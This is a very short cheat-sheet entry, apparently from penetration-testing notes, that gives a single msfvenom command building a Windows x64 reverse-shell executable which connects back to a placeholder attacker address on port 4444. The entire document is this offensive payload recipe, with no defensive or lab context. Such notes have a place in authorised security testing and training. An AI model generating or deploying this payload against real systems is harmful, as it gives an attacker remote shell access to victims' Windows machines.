# msfvenom

Create a reverse shell for Windows with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPADDRESS LPORT=4444 -f exe -o reverse.exe
```

